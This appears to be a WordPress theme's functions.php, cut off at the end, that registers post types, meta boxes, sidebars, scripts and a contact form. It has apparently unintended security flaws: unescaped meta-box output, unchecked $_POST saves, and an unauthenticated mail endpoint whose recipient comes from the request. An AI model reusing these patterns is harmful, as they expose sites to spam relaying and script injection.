<?php

include_once(get_template_directory().'/libs/global.php');
include_once(get_template_directory().'/ui/custom-menu.php');
include_once(get_template_directory().'/libs/shortcodes.php');
require(get_template_directory().'/xr_widgets/xr_twitter.php');

// Enable post thumbnails
add_theme_support('post-thumbnails');
add_image_size( 'homepage-thumb', 290, 200,true);
add_image_size( 'full-column-img', 640, 280,true);
add_image_size('slider-images',960,350,true);

add_image_size( 'gallery-two', 470, 360,true);

add_image_size( 'gallery-three', 310, 240,true);
add_image_size( 'gallery-four', 230, 180,true);
add_image_size( 'gallery-five', 182, 140,true);
add_image_size( 'gallery-six', 150, 110,true);
add_image_size('footer-image',80,60,true);

function enqueue_required_files() {
	wp_enqueue_style( 'google-fonts-ropa', 'http://fonts.googleapis.com/css?family=Ropa+Sans', '', '', 'screen' );
	wp_enqueue_style( 'nevon_google-open', 'http://fonts.googleapis.com/css?family=Open+Sans:400,600,700|Yanone+Kaffeesatz:400,300', '', '', 'screen' );
	wp_enqueue_style( 'nevon_google-condensed', 'http://fonts.googleapis.com/css?family=Open+Sans+Condensed:700,300,300italic', '', '', 'screen' );
	
	$html = ot_get_option("google_font_js");
	
	if(isset($html) && strlen($html) > 0){
		if(preg_match("/<link href='(.*?)'>/i", $html, $matches)) {
				$url = $matches[1];
		}
		wp_enqueue_style('nevon-user-google-font', $url,'','','screen');
	}
	
	wp_enqueue_script('jquery-color', JS_WAY.'/jquery.color.js','jquery', array('jquery'));
	wp_enqueue_script('jquery-easing', JS_WAY.'/jquery.easing.1.3.js','jquery', array('jquery'));
	wp_enqueue_script('jquery-ui', JS_WAY.'/jquery-ui.min.js','jquery', array('jquery'));
	wp_enqueue_script('jquery-quicksand', JS_WAY.'/jquery.quicksand.js','jquery', array('jquery'));
	wp_enqueue_script('jmpress', JS_WAY.'/jmpress.min.js','jquery', array('jquery'));
	wp_enqueue_script('jquery-modernizr', JS_WAY.'/modernizr.custom.48780.js','jquery', array('jquery'));
	wp_enqueue_script('google-jsapi', JS_WAY.'/jsapi.js','jquery', array('jquery'));
	wp_enqueue_script('google-callback', JS_WAY.'/google-callback-api.js','jquery', array('jquery'));
	wp_enqueue_script('nevon-basic-slider', JS_WAY.'/nevon.basic.slider.1.0.js','jquery', array('jquery'));
	wp_enqueue_script('nevon-default-jquery', JS_WAY.'/jquery.default.1.0.js','jquery', array('jquery'));
	wp_enqueue_script('nevon-default-load-jquery', JS_WAY.'/jquery.default.load.1.0.js','jquery', array('jquery'));
	
	if( ot_get_option('home_slider_layout','nevon') != "nevon"){
		wp_enqueue_style('iview-style', F_WAY.'/css/iview.css','','','screen');
		
		//wp_enqueue_script('nevon-basic', JS_WAY.'/nevon.basic.slider.1.0.js','jquery', array('jquery'));
		wp_enqueue_script( 'raphael', JS_WAY.'/raphael-min.js','jquery', array('jquery'));
		wp_enqueue_script( 'iview', JS_WAY.'/iview.js','jquery', array('jquery'));
		wp_enqueue_script( 'iview-starter', JS_WAY.'/iview-starter.js','jquery', array('jquery'));
	}
	
	
}    
 
add_action('wp_enqueue_scripts', 'enqueue_required_files');


$content_width = 960;
function alter_default_comment_form($defaults){
	$fields = array('author' => '<li><input name="author" id="author" class="comments-field inputs-class" title="Name :" type="text" value="Name :"></li>',
					'email' => '<li><input name="email" id="email" class="comments-field inputs-class" style="margin-right:0px;" title="Email :" type="text" value="Email :"></li>',
					'url' => '');
	$defaults['fields'] = apply_filters( 'comment_form_default_fields', $fields );
	$defaults['title_reply'] = '<div class="small-header-text-container"><span class="small-header-text">'._('Leave a Comment').'</span><span class="right"></span></div>';
    $defaults['comment_notes_before'] = '';
    $defaults['comment_notes_after'] = '';
	$defaults['comment_field'] = '<textarea class="comments-field inputs-class" style="width:96%; margin-top:0px;" title="Your Message :" name="comment" id="comment" cols="100%" rows="10" tabindex="4">Your Message :</textarea>';
	$defaults['id_submit'] = 'comments-submit';

    return $defaults;
	//apply_filters( 'comment_form_defaults', $defaults );
}

add_filter('comment_form_defaults','alter_default_comment_form');

/**
 * RESPONSIVE IMAGE FUNCTIONS
 */

add_filter('post_thumbnail_html','remove_thumbnail_dimensions',10);
add_filter( 'gallery-two', 'remove_thumbnail_dimensions', 10 );
add_filter('the_content','remove_thumbnail_dimensions',10);


function remove_thumbnail_dimensions( $html ) {
	$html = preg_replace( '/(width|height)=\"\d*\"\s/', "", $html );
	return $html;
}

/*
 * Print the title tag based on what is being viewed.
 * 
 * @author Ryan Hellyer <ryan@pixopoint.com>
 * @return string
 */
function themeprefix_title() {
    $title = '';
 
    // Single post
    if ( is_single() ) {
        $title .= single_post_title( '', false );
        $title .= ' | ';
        $title .= get_bloginfo( 'name' );
    }
 
    // Home page
    elseif ( is_home() ) {
        $title .= get_bloginfo( 'name' );
        $title .= ' | ';
        $title .= get_bloginfo( 'description' );
        if ( get_query_var( 'paged' ) )
            $title .= ' | ' . __( 'Page', 'themename' ) . ' ' . get_query_var( 'paged' );
    }
 
    // Static page
    elseif ( is_page() ) {
        $title .= single_post_title( '', false );
        $title .= ' | ';
        $title .= get_bloginfo( 'name' );
    }
 
    // Search page
    elseif ( is_search() ) {
        $title .= get_bloginfo( 'name' );
        $title .= ' | Search results for ' . esc_html( $s ); 
        if ( get_query_var( 'paged' ) )
            $title .= ' | ' . __( 'Page', 'themename' ) . ' ' . get_query_var( 'paged' );
    }
 
    // 404 not found error
    elseif ( is_404() ) {
        $title .= get_bloginfo( 'name' );
        $title .= ' | ' . __( 'Not Found', 'themename' );
    }
 
    // Anything else
    else {
        $title .= get_bloginfo( 'name' );
        if ( get_query_var( 'paged' ) )
            $title .= ' | ' . __( 'Page', 'themename' ) . ' ' . get_query_var( 'paged' );
    }
 
    return $title;
}
add_filter( 'wp_title', 'themeprefix_title', 1 );

function getMainMenu($menulocation){
  $locations = get_nav_menu_locations();
  $menuItems = wp_get_nav_menu_items( $locations[ $menulocation ] );
    if(empty($menuItems))
      return false;
    else{
      //wp_nav_menu(array('theme_location' => $menulocation));
	  wp_nav_menu( array( 'sort_column' => 'menu_order', 'menu_class' => 'nav', 'theme_location' => 'primary-menu' ) ); 
      return true;
    }
}



if(!term_exists("iView Slider Posts")){
	$argProducts = array('description' => "iView Slider Posts", 'parent' => 0);
	$new_cat_id = wp_insert_term("iView Slider Posts", "category", $argProducts);
}

if(!term_exists("Footer Posts")){
	$argProducts = array('description' => "Footer Posts", 'parent' => 0);
	$new_cat_id = wp_insert_term("Footer Posts", "category", $argProducts);
}

if(!term_exists("Blog")){
	$argProducts = array('description' => "Blog", 'parent' => 0);
	$new_cat_id = wp_insert_term("Blog", "category", $argProducts);
}


/**
 * Theme Options
 */
include_once( 'includes/theme-options.php' );

/**
 * Optional: set 'ot_show_pages' filter to false.
 * This will hide the settings & documentation pages.
 */
add_filter( 'ot_show_pages', '__return_false' );

/**
 * Required: set 'ot_theme_mode' filter to true.
 */
add_filter( 'ot_theme_mode', '__return_true' );

/**
 * Required: include OptionTree.
 */
include_once( 'option-tree/ot-loader.php' );

//FOR ADDING ADMIN AVATAR
add_filter( 'avatar_defaults', 'newgravatar' );

function newgravatar($avatar_defaults) {
	$myavatar = get_template_directory_uri() .'/images/user_logo.jpg';
	$avatar_defaults[$myavatar] = "Your Avatar";
	return $avatar_defaults;
}

add_filter('dynamic_sidebar_params', 'sidebar_styling');
function sidebar_styling($params){
	
	if(strpos($params[0]['id'],"footer-widgets") !== 0){
	  $params[0]['before_title'] = '<div class="sidebar-header-text-container">
				<span class="left"></span>
				<span class="sidebar-header-text">';
	  $params[0]['after_title']= '</span>
				<span class="right"></span>
				</div>
				<div class="clearFix"></div>';
	  return $params;
	}
	
	return $params;
}

function makePagination($userVar = false){
	global $wp_query;
	
	$total_pages = $wp_query->max_num_pages;
	if ($total_pages > 1){  
  
	  $current_page = max(1, get_query_var('paged'));  
	if(!$userVar){
	  echo paginate_links(array(  
		  'base' => get_pagenum_link(1) . '%_%',  
		  'format' => '/page/%#%',  
		  'current' => $current_page,  
		  'total' => $total_pages,  
		));  
	}else{
	  return paginate_links(array(  
		  'base' => get_pagenum_link(1) . '%_%',  
		  'format' => '/page/%#%',  
		  'current' => $current_page,  
		  'total' => $total_pages,  
		));  
	}
	}
	
}

//Some simple code for our widget-enabled sidebar
if ( function_exists('register_sidebar') )
    register_sidebar();

//Code for custom background support
add_theme_support( 'custom-background', array() );

//Enable post and comments RSS feed links to head
add_theme_support( 'automatic-feed-links' ); 

//slice home page text
function custom_excerpt_length( $length ) {
	return 14;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );


//For Featured Products
function register_products(){
	register_post_type('nevonproducts', array(
		'label' => 'Nevon Products',
		'singular_label' => 'Featured Product',
		'public' => true,
		'show_ui' => true,
		'capability_type' => 'post',
		'hierarchical' => false,
		'rewrite' => array(
			'slug' => ot_get_option('nevon_products_slug','products'),
			'with_front' => FALSE,
		  ),
		'query_var' => true,
		'menu_icon' => F_WAY .'/images/admin-icons/plus.png',
		'supports' => array('title', 'date', 'editor','thumbnail','comments')
	));
	register_taxonomy("nevonproductstype", array("nevonproducts"), array("hierarchical" => true,"label" => "Nevon Product Cats", "singular_label" => "Nevon Product Cat"));
	register_taxonomy_for_object_type('category', 'nevonproducts');

}
//register_taxonomy_for_object_type('category', 'custom-type');
add_action('init', 'register_products');


//For Featured Products
function register_testimonials(){
	register_post_type('testimonials', array(
		'label' => 'Testimonials',
		'singular_label' => 'Testimonial',
		'public' => true,
		'show_ui' => true,
		'capability_type' => 'post',
		'hierarchical' => false,
		'rewrite' => array(
			'slug' => ot_get_option('nevon_testimonials_slug','testimonials'),
			'with_front' => FALSE,
		  ),
		'query_var' => true,
		'menu_icon' => F_WAY .'/images/admin-icons/need.png',
		'supports' => array('title', 'editor','excerpt')
	));
}
//register_taxonomy_for_object_type('category', 'custom-type');
add_action('init', 'register_testimonials');




// Hook into WordPress
add_action( 'admin_init', 'add_custom_metabox' );
add_action( 'save_post', 'save_custom_url' );
add_action( 'save_post', 'save_extra_btn' );
add_action( 'save_post', 'save_iview_tags' );


/**
 * Add meta box
 */
function add_custom_metabox() {
	foreach (array('post','page','filteredgallery','nevonproducts') as $type) 
    {
		add_meta_box( 'linkto_metabox',  'URL &amp; Description' , 'url_custom_metabox', $type, 'side', 'default' );
		add_meta_box('iview_tags', 'iView Tags :  Tags to show on iView Slider' , 'ivew_tags_func', $type, 'normal', 'default' );
        //add_meta_box('my_all_meta', 'My Custom Meta Box', 'my_meta_setup', , 'normal', 'high');
    }
	
	foreach (array('references') as $type) 
	{
		add_meta_box( 'linkto_metabox',  'URL &amp; Description' , 'url_custom_metabox', $type, 'side', 'default' );
	}
	
	foreach ( array('nevonproducts') as $type){
		add_meta_box( 'btn_metabox',  'Link &amp; Button Name' , 'add_btn_metabox', $type, 'side', 'default' );
	}
	
	if(post_type_exists('slider-image')){
		foreach ( array('slider-image') as $type){
			add_meta_box( 'btn_metabox',  'Link &amp; Button Name' , 'add_btn_metabox', $type, 'side', 'default' );
		}
	}
		
}

/**
 * Display the metabox
 */
function add_btn_metabox() {
	global $post;
	$btnLink = get_post_meta( $post->ID, 'btnLink', true );
	$btnName = get_post_meta( $post->ID, 'btnName', true );

	if ( !preg_match( "/http(s?):\/\//", $urllink )) {
		$errors = 'Url not valid';
		$urllink = 'http://';
	} 

	// output invlid url message and add the http:// to the input field
	if( $errors ) { echo $errors; } ?>

	<p><label for="btnLink">Url:<br />
		<input id="btnLink" size="37" name="btnLink" value="<?php if( $btnLink ) { echo $btnLink; } ?>" /></label></p>
	<p><label for="btnName">Button Name:<br />
		<input id="btnName" name="btnName" size="37" value="<?php if( $btnName ) { echo $btnName; } ?>" /></label></p>
<?php
}

function url_custom_metabox() {
	global $post;
	$urllink = get_post_meta( $post->ID, 'urllink', true );
	$urldesc = get_post_meta( $post->ID, 'urldesc', true );

	if ( !preg_match( "/http(s?):\/\//", $urllink )) {
		$errors = 'Url not valid';
		$urllink = 'http://';
	} 

	// output invlid url message and add the http:// to the input field
	if( $errors ) { echo $errors; } ?>

	<p><label for="siteurl">Url:<br />
		<input id="siteurl" size="37" name="siteurl" value="<?php if( $urllink ) { echo $urllink; } ?>" /></label></p>
	<p><label for="urldesc">Url Description:<br />
		<textarea id="urldesc" name="urldesc" cols="45" rows="4"><?php if( $urldesc ) { echo $urldesc; } ?></textarea></label></p>
<?php
}

function ivew_tags_func() {
	global $post;
	$tag1 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag1', true )));
	$tag2 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag2', true )));
	$tag3 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag3', true )));
	$tag4 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag4', true )));

 ?>

	<p><label for="tag1">Tag 1 Header :<br />
		<input id='tag1' size='37' name='tag1' value='<?php if( $tag1 ) { echo $tag1; } ?>' /></label></p>
	<p><label for="tag2">Tag 2 :<br />
		<input id='tag2' size='37' name='tag2' value='<?php if( $tag2 ) { echo $tag2; } ?>' /></label></p>
	<p><label for="tag3">Tag 3 :<br />
		<input id='tag3' size='37' name='tag3' value='<?php if( $tag3 ) { echo $tag3; } ?>' /></label></p>
	<p><label for="tag4">Tag 4 :<br />
		<input id='tag4' size='37' name='tag4' value='<?php if( $tag4 ) { echo $tag4; } ?>' /></label></p>
<?php
}


/**
 * Process the custom metabox fields
 */
 
function save_extra_btn( $post_id ) {
	global $post;	

	if( $_POST ) {
		update_post_meta( $post->ID, 'btnLink', $_POST['btnLink'] );
		update_post_meta( $post->ID, 'btnName', $_POST['btnName'] );
	}
}

function save_custom_url( $post_id ) {
	global $post;	

	if( $_POST ) {
		update_post_meta( $post->ID, 'urllink', $_POST['siteurl'] );
		update_post_meta( $post->ID, 'urldesc', $_POST['urldesc'] );
	}
}

function save_iview_tags( $post_id ) {
	global $post;	

	if( $_POST ) {
		update_post_meta( $post->ID, 'tag1', json_encode($_POST['tag1']) );
		update_post_meta( $post->ID, 'tag2', json_encode($_POST['tag2']) );
		update_post_meta( $post->ID, 'tag3', json_encode($_POST['tag3']) );
		update_post_meta( $post->ID, 'tag4', json_encode($_POST['tag4']) );
	}
}


/**
 * Get and return the values for the URL and description
 */
function get_extra_btn() {
	global $post;
	$btnLink = get_post_meta( $post->ID, 'btnLink', true );
	$btnName = get_post_meta( $post->ID, 'btnName', true );

	return array( $btnLink, $btnName );
}

function get_url_desc_box() {
	global $post;
	$urllink = get_post_meta( $post->ID, 'urllink', true );
	$urldesc = get_post_meta( $post->ID, 'urldesc', true );

	return array( $urllink, $urldesc );
}

function get_ivew_tags() {
	global $post;
	$tag1 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag1', true )));
	$tag2 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag2', true )));
	$tag3 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag3', true )));
	$tag4 = stripslashes(json_decode(get_post_meta( $post->ID, 'tag4', true )));

	return array( $tag1, $tag2, $tag3, $tag4 );
}






function register_portfolio(){
//For Portfolio Products
register_post_type('filteredgallery', array(
	'label' => 'Nevon Gallery Images',
	'singular_label' => 'Nevon Gallery Image',
	'public' => true,
	'show_ui' => true,
	'capability_type' => 'post',
	'hierarchical' => false,
	'rewrite' => array(
			'slug' => ot_get_option('nevon_gallery_slug','gallery'),
			'with_front' => FALSE,
	),

	'query_var' => true,
	'menu_icon' => F_WAY .'/images/admin-icons/plus.png',
	'supports' => array('title', 'date', 'editor', 'thumbnail')
));
register_taxonomy("filteredgallerytype", array("filteredgallery"), array("hierarchical" => true,"label" => "Nevon Gallery Categories", "singular_label" => "Nevon Gallery Category"));
//register_taxonomy_for_object_type('category', 'filteredgallery');
}

add_action('init', 'register_portfolio');


add_filter('pre_get_posts', 'query_post_type');
function query_post_type($query) {
  if(is_category() || is_tag()) {
    $query->set('post_type','any');
	return $query;
    }
}


function register_references(){
//For Portfolio Products
register_post_type('references', array(
	'label' => 'References',
	'singular_label' => 'Reference',
	'public' => true,
	'show_ui' => true,
	'capability_type' => 'post',
	'hierarchical' => false,
	'rewrite' => array(
		'slug' => ot_get_option('nevon_references_slug','references'),
		'with_front' => FALSE,
	),

	'query_var' => true,
	'menu_icon' => F_WAY .'/images/admin-icons/ref.png',
	'supports' => array('title', 'date',  'thumbnail')
));
}

add_action('init', 'register_references');




function register_our_team(){
//For Portfolio Products
register_post_type('ourteam', array(
	'label' => 'Our Team',
	'singular_label' => 'Our Team',
	'public' => true,
	'show_ui' => true,
	'capability_type' => 'post',
	'hierarchical' => false,
	'rewrite' => array(
		'slug' => ot_get_option('nevon_ourteam_slug','ourteam'),
		'with_front' => FALSE,
	),

	'query_var' => true,
	'menu_icon' => F_WAY .'/images/admin-icons/team.png',
	'supports' => array('title', 'date', 'editor', 'thumbnail')
));
register_taxonomy("ourteamtype", array("ourteam"), array("hierarchical" => true,"label" => "Our Team Cats", "singular_label" => "Our Team Cat"));
	if (!term_exists( 'CEO', 'ourteamtype') ){
        wp_insert_term( 'CEO', 'ourteamtype' );
    };
	
	if (!term_exists( 'Founder', 'ourteamtype') ){
        wp_insert_term( 'Founder', 'ourteamtype' );
    };

	if (!term_exists( 'Manager', 'ourteamtype') ){
        wp_insert_term( 'Manager', 'ourteamtype' );
    };
	
	if (!term_exists( 'Employee', 'ourteamtype') ){
        wp_insert_term( 'Employee', 'ourteamtype' );
    };
	
}

add_action('init', 'register_our_team');



function footer_widgets() {
	
	register_sidebar( array(
	'name' => 'Footer Widget 1',
	'id' => 'footer-widgets-1',
	'description' =>  'Add First Footer Widget Here',
	'before_widget' => '<li id="%1$s" class="widget-container %2$s four columns">',
	'after_widget' => "</li>",
	'before_title' => '<h3 class="widget-title">',
	'after_title' => '</h3>',
	) );
	
	
	register_sidebar( array(
	'name' => 'Footer Widget 2',
	'id' => 'footer-widgets-2',
	'description' =>  'Add Second Footer Widget Here',
	'before_widget' => '<li id="%1$s" class="widget-container %2$s four columns">',
	'after_widget' => "</li>",
	'before_title' => '<h3 class="widget-title">',
	'after_title' => '</h3>',
	) );


	register_sidebar( array(
	'name' => 'Footer Widget 3',
	'id' => 'footer-widgets-3',
	'description' => 'Add Third Footer Widget Here',
	'before_widget' => '<li id="%1$s" class="widget-container %2$s four columns">',
	'after_widget' => "</li>",
	'before_title' => '<h3 class="widget-title">',
	'after_title' => '</h3>',
	) );

	register_sidebar( array(
	'name' => 'Footer Widget 4',
	'id' => 'footer-widgets-4',
	'description' => 'Add Fourth Footer Widget Here',
	'before_widget' => '<li id="%1$s" class="widget-container %2$s four columns">',
	'after_widget' => "</li>",
	'before_title' => '<h3 class="widget-title">',
	'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
	'name' => 'Footer Bottom Widget 1',
	'id' => 'footer-bottom-1',
	'description' => 'Add Custom Menu Here',
	'before_widget' => '<li id="%1$s" class="widget-container %2$s right">',
	'after_widget' => "</li>",
	'before_title' => '<h3 class="widget-title">',
	'after_title' => '</h3>',
	) );
	
}
// Add the widget areas
add_action( 'init', 'footer_widgets' );

function ajax_contact() {
	if(empty($_POST['name']) || empty($_POST['email']) || empty($_POST['message']) || empty($_POST['user'])) {
		die('Error: Missing variables');
	}
	
	$name=$_POST['name'];
	$email=$_POST['email'];
	$subject=$_POST['subject'];
	$message=$_POST['message'];
	
	$to=$_POST['user'];
	
	$headers = 'From: '.$email."\r\n" .
		'Reply-To: '.$email."\r\n" .
		'X-Mailer: PHP/' . phpversion();
	$subject = $subject;
	$body='You have got a new message from the contact form on your website.'."\n\n";
	$body.='Name: '.$name."\n";
	$body.='Email: '.$email."\n";
	$body.='Subject: '.$subject."\n";
	$body.='Message: '."\n".$message."\n";
		
	if(wp_mail($to, 'A new Email', $body)) {
		die('Mail sent');
	} else {
		die('Error: Mail failed');
	}
}



function checking_user(){
	if(is_user_logged_in()){
		add_action('wp_ajax_contact_forum','ajax_contact');
	}else{
		add_action('wp_ajax_nopriv_contact_forum','ajax_contact');
	}
}

add_action('init','checking_user');


//For showing first images in the post
function catch_that_image() {
  global $blogPost, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', get_the_content(), $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){ //Defines a default image
    $first_img = F_WAY."/images/default.jpg";
  }
  return $first_img;
}

function strip_images($len = 0,$readMore = true){
   global $blogPost, $posts;
   $return = "";
	if($len == 0){
 	    $return =preg_replace('/<img[^>]+./','',strip_shortcodes(get_the_content(ot_get_option('read_more_text')), false));
		$return = preg_replace('/<h[^>]+./','',$return);
		$return = preg_replace('/<block[^>]+./','',$return);
		$return = preg_replace('/<a class="button([^<]*)">([^<]*)<\/a>/', '', $return);
		$return = str_replace('"','',$return);
		$return = trim($return);
		if($readMore){
			return $return;
		}else{
			return preg_replace('/<a([^<]*)">([^<]*)<\/a>/', '', $return);
		}
   
	}else{
		$return = preg_replace('/<img[^>]+./','',strip_shortcodes(str_replace(array("[type]","[/type]"), "", get_the_content())));
		$return = preg_replace('/<h[^>]+./','',$return);
		$return = preg_replace('/<block[^>]+./','',$return);
		$return = preg_replace('/<a class="button([^<]*)">([^<]*)<\/a>/', '', $return);
		$return = preg_replace('/<a href=([^<]*)">([^<]*)<\/a>/', '', $return);
		$return = str_replace(array("\n","\r"), "", $return);
		if($return{0} == "&") $return = substr($return,6,strlen($return)-1);
		$return = trim($return);
		//var_dump($return{0});
		//$return = mysql_real_escape_string($return);
		$return = substr($return,0,$len);
		if($readMore){
		   return $return.' <a href="'.get_permalink().'">'.ot_get_option('read_more_text').'</a>';
		}else{
			return $return;
		}
	}
}

function the_breadcrumb() {
	global $post;
 if ((is_page() && !is_front_page()) || is_home() || is_category() || is_single()) {
 echo '<ul class="breadcrumbs">';
 $post_ancestors = get_post_ancestors($post);
 if(count($post_ancestors) > 0) {
	 echo '<li><a href="'.get_bloginfo('url').'">Home</a> > </li>';
 }else{
	 echo '<li><a href="'.get_bloginfo('url').'">Home</a> > </li>';
 }

 if ($post_ancestors) {
 $post_ancestors = array_reverse($post_ancestors);
 foreach ($post_ancestors as $crumb)
 echo '<li> <a href="'.get_permalink($crumb).'">'.get_the_title($crumb).'</a> ></li>';
 }
 if (is_category() || is_single()) {
 $category = get_the_category();
	 if(is_category()){
		 echo '<li> <a href="'.get_category_link($category[0]->cat_ID).'">'.$category[0]->cat_name.'</a> ></li>';
	 }else if(is_single()){
		 if(is_post_type(get_post_type())){
			 $thisType = _(get_post_type());
			 if($thisType == "post") $thisType = _("Blog");
			// echo '<li> <a href="'.$_SERVER['HTTP_REFERER'].'">'.ucfirst($thisType).'</a> ></li>';
		 }else{
			 echo '<li> <a href="'.get_permalink($crumb).'">'.get_the_title($crumb).'</a> ></li>';
		 }
	 }
 }
 if (!is_category())
 echo '<li> '.get_the_title().'</li>';
 echo '</ul>';
 echo '<div class="clearFix"></div>';
 }
}

function is_post_type($type){
    global $wp_query;
    if($type == get_post_type($wp_query->post->ID)) return true;
    return false;
}

/*
	FOR GLOBAL VARIABLES
*/
$sidebar = ot_get_option("theme_layout");
$home_layout = ot_get_option('home_slider_layout','nevon');

function make_unique_text(){
	$str = uniqid(rand().date("siH"),true);
	$input = array(0,1,2,3,4,5,6,7,8,9);
	$output = array("zero","one","two","three","four","five","six","seven","eight","nine");
	$str = str_replace($input,$output,$str);
	if(strlen($str) > 18) $str = substr($str,0,18);
	return $str;
}


/*
	FOR COUNTING POST VIEWS
*/

function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

###########################################################
function get_default_value($value) {
    $text = get_option($value);
	//print_r($text);
    if ($text === '') {
		global $options;
		foreach($options as $datas){
			if($datas['id'] == $value && array_key_exists('std', $datas)){
				$text = $datas['std'];
			}
		}
    }
    echo $text;
	//return $text;
}

//FOR BLOG POSTS SHARE

function activate_share(){
	$twitter = ot_get_option('twitter_tweet');
	$facebook = ot_get_option('facebook_like');
	$google = ot_get_option('google_share');
	$pinterest = ot_get_option('pinterest');
	
	$return = '';
	if($twitter[0] === 'Yes'){
		$return .= '<div class="blog-share" style="float:left; margin-right:-23px;">'.
		do_shortcode("[tf show_count=true]Nickiler[/tf]").
		'</div>
		';
	}
	if($facebook[0] == "Yes"){
		$return .= '<div class="blog-share" style="float:left;">'.
		do_shortcode("[fb]").'
		</div>
		';	
	}
	if($google[0] == "Yes"){
		$return .= '<div class="blog-share" style="float:left; ">'.
		do_shortcode("[p1]").'
		</div>
		';	
	}
	if($pinterest[0] == "Yes"){
		$return .= '<div class="blog-share" style="float:left;">'.
		do_shortcode("[sharePin]").'
		</div>
		';	
	}
	
	$return .= '<div class="clearFix"></div>';
	
	return $return;
}

function bgmpShortcodeCalled()
{
    global $post;
    
    $shortcodePageSlugs = array(
        'contact'
    );
    
    if( $post )
        if( in_array( $post->post_name, $shortcodePageSlugs ) )
            add_filter( 'bgmp_map-shortcode-called', '__return_true' );
}
add_action( 'wp', 'bgmpShortcodeCalled' );


function setBGMPMapShortcodeArguments( $options )
{
    global $bgmp;
    $coordinates = $bgmp->geocode( 'Seattle' );
    
    $options[ 'mapWidth' ]                = 960;
    $options[ 'mapHeight' ]               = 400;
    $options[ 'infoWindowMaxWidth' ]  = 350;
    
    return $options;
}
add_filter( 'bgmp_map-shortcode-arguments', 'setBGMPMapShortcodeArguments' );






/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @package	   TGM-Plugin-Activation
 * @subpackage Example
 * @version	   2.3.6
 * @author	   Thomas Griffin <thomas@thomasgriffinmedia.com>
 * @author	   Gary Jones <gamajo@gamajo.com>
 * @copyright  Copyright (c) 2012, Thomas Griffin
 * @license	   http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/thomasgriffin/TGM-Plugin-Activation
 */

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once get_template_directory(). '/libs/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'my_theme_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * In this example, we register two plugins - one included with the TGMPA library
 * and one from the .org repo.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function my_theme_register_required_plugins() {

	/**
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(

		// This is an example of how to include a plugin pre-packaged with a theme
		array(
			'name'     				=> 'Basic Google Maps Placemarks', // The plugin name
			'slug'     				=> 'basic-google-maps-placemarks', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/plugins-to-include/basic-google-maps-placemarks.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),

		// This is an example of how to include a plugin pre-packaged with a theme
		array(
			'name'     				=> 'Twitter Widget', // The plugin name
			'slug'     				=> 'dp-twitter-widget', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/plugins-to-include/dp-twitter-widget.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),

		// This is an example of how to include a plugin pre-packaged with a theme
		array(
			'name'     				=> 'Nevon Slider', // The plugin name
			'slug'     				=> 'nevon-slider', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/plugins-to-include/nevon-slider.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		
		// This is an example of how to include a plugin pre-packaged with a theme
		array(
			'name'     				=> 'Pretty Photo Media', // The plugin name
			'slug'     				=> 'prettyphoto-media', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/plugins-to-include/prettyphoto-media.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		
		// This is an example of how to include a plugin pre-packaged with a theme
		array(
